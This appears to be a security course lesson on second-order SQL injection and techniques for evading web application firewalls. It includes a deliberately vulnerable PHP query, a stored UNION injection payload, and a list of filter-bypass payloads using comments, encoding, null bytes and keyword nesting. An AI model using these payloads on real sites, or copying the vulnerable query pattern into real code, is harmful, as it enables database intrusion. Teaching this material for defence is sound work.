# SECOND ORDER INJECTION & WAF EVASION - LESSON 04

## 'SECOND ORDER INJECTION

Every SQLi discussed in previous lessons can be classified as "first-order"
SQL injection.
"First-order" means that the injection occur in a single HTTP request and a
single response.
With "second-order" injections we identify that occur in more than a single HTTP
request and response. Consider the following flow:

1. A malicious input is submitted in an HTTP request.
2. Application stores that input and responds to the request.
3. A second different is submitted to the application.
4. The application retrieves and processes the stored input, causing the SQLi.
5. The result of the SQLi is returned in the response (not always).

"Second-order" injections happens because developers tend to trust an input
retrieved from database without sanitizing it as happens for user supplied
input.

To prevent any form of SQLi a developer must sanitize every database query,
possibly using prepared statements.

#### Example
Given this PHP code:

```php
  // We're switching to Capsule as ORM to write queries.
  $user = $capsule->table('users')->where('id', '=', $_GET['id'])->first();
  // produces: SELECT * from `users` where id = 1; <<< can't inject anything here

  // No need to use prepared statements here, the input comes from DB.
  $messages = Capsule::select("SELECT id, username, message FROM messages WHERE username = '" . $user->username . "'");
  foreach($messages as $message) {
    echo $message->text;
  }
```
N.B. the comment is sarcastic. It is a bad security practice trust an input
just because come from DB.

This code gets an `id` from the request, selects the username from the DB (using
a prepared statement) and the uses the `$user->username` query response to
perform another query (without using a prepared statement).
This seems not vulnerable because we can't inject anything in the `id`.
But what happens if we can control the `username` (seems reasonable if the
application includes a user subscription):

We sign-up a user with a username= `' UNION ALL SELECT @@version, 2, 3`.
The we request the page with the `id` associated to our page.
Ex. `id=1`
```sql
/* First query gets executed: */
SELECT * from `users` where id = 1;
/*
the $user variable will contain:
array(
  "id" => 1,
  "username" => "' UNION ALL SELECT @@version, 2, 3"
)
The second query gets executed:
*/
SELECT id, username, message FROM messages WHERE username = ''
UNION ALL SELECT @@version, 2, 3
/*
# The injection gets triggered !!!
*/
```

Finding second-order injections is more difficult than first-order because
usually you are totally blind and the exploit needs more than one single request
to gets triggered. Automated tools are also often ineffective because a
second-order SQLi is strictly bound to the application flow.

## 'WAF EVASION

Often Web-Application use input filters to defend against attacks, including
SQLi. This tools are called WAF (Web Application Firewall) and can be
included in application code or implemented as an external tool
(e.g. mod_security for Apache).
WAFs can block a malicious request or try to sanitize the inputs.

Usually a WAF search for:
- SQL keywords or expression
- Common SQLi pattern
- Specific characters, like `-`, or `"`, etc.
- Whitespace

### Common techniques to evade WAF
Follow a series of techniques to evade WAFs. This list can't be complete and
exhaustive, but it is useful to understand how an evasion can be performed.

#### Case Variation
Filter: `UNION`, `union`

Evasion: `UnIoN`, `uNiOn`

#### SQL comments
Filter: `UNION` after lowercasing it (case-variation not works)

Evasion: `UN/**/ION` (works in MySQL)

Filter: `UNION ALL` after lowercasing it (case-variation not works)

Evasion: `UNION/**/ALL`

#### HPF (HTTP Parameter Fragmentation)
If multiple parameters of the application are vulnerable to SQLi we can
concatenate multiple comments in multiple variable to evade WAF:

Filter: `UNION`, `/**/`

Ex query:

`$sql = 'SELECT * FROM news WHERE day = "'. $day .'" AND month = "' . $month . '" AND year = "'. $year .'"'`

Evasion:
```
$day = " UNI/*
$month = */ON/*
$year = */ ALL SELECT 1,2,3 -- -
```

Result:

`$sql = 'SELECT * FROM news WHERE day = "" UNI/*" AND month = "*/ON/*" AND year = "*/ ALL SELECT 1,2,3 -- -"'`

After removing comments:

`$sql = 'SELECT * FROM news WHERE day = "" UNION ALL SELECT 1,2,3 -- -"'`

#### URL-encoding
Replacing problematic inputs with their ASCII code preceded by `%`.
Ex. `0x55` is the ASCII code of `U`, so `%55` is the URL-encoded version.

Filter: `UNION` after lowercasing it (case-variation not works) and inline comments

Evasion: `%55NION` => Works if the filtering is performed before URL-decoding.

#### Double URL-encoding
Sometimes applications perform URL-decoding more than once.
We can try to bypass filter applying a double URL encoding.
Ex. `0x55` is the ASCII code of `U`, so `%55` is the URL-encoded version.
We URL-encode also `%55` obtaining `%2555` (where `%25` is the URL-encoded version of `%`).

Filter: `UNION` after lowercasing it (case-variation not works) and inline comments

Evasion: `%2555NION` => Works if the filtering is performed before URL-decoding.

#### Manipulating strings
Filter: `SELECT`

Evasion: `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)` works only on MSSQL.

Filter: `admin`

Evasion: `REVERSE('nimda')`, `REPLACE('bdmin', 'b', 'a')`, `CONCAT('a','dmin')`

on MySQL we can't use string functions on statements.

#### Using Null Bytes
Sometimes WAFs are written in languages that uses the null bytes `0x00` to determine
the end of a string. We can exploit this to evade a filter.

Filter: `UNION`

Evasion: `%00UNION` <- The filter stops to `%00` as the string is interpreted with a lenght of `0`.

#### Nesting expressions
Some WAF simply strip one time all blacklisted words.

Filter: `UNION`

Evasion: `UNIUNIONON` -> after strip: `UNION`

Refer to [Owasp](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) for
more examples and techniques.
